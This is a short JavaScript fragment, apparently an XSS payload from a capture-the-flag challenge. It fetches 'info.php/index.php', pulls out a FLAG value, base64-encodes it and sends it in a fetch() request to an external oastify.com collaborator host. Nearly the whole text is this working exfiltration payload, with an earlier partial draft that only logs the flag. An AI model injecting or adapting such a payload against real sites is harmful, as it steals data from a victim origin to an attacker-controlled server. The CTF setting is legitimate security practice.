...
fetch('info.php/index.php')
  ...
  .then(text => {
    let flag = text.split('FLAG=')[1]?.split('<')[0];
    if (flag) {
      console.log(flag);
    } else {
...
fetch('info.php/index.php').then(response => response.text()).then(text => {let flag =text.split('FLAG=')[1]?.split('<')[0];if (flag) {let encodedData = btoa(flag);fetch(`http://154cpie4qhfjtnyb260ip55j5ab1ztthi.oastify.com/${encodedData}`);}else{let encodedData = btoa("FLAG not found");fetch(`http://154cpie4qhfjtnyb260ip55j5ab1ztthi.oastify.com/${encodedData}`);}});
